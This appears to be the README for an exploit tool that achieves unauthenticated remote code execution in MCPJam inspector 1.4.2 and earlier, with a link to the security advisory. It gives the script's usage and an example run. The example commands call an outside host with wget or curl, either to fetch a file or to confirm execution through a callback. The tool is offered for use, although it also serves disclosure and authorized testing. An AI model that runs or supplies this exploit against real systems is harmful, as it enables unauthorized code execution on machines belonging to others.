# mcpjaminspector-unauth-rce
RCE in MCPJam inspector &lt;= 1.4.2

# Vulnerability details

https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6

# Usage

```
usage: mcpjaminspector-unauth-rce.py [-h] --target TARGET --command COMMAND

options:
  -h, --help         show this help message and exit
  --target TARGET    Target e.g https://127.0.0.1
  --command COMMAND  Command to exec on remote target. e.g: wget http://YOU/f
```

```bash
python3 mcpjaminspector-unauth-rce.py --target "http://mymcp.local/" --command "curl http://myinteractsh.local/test"
```

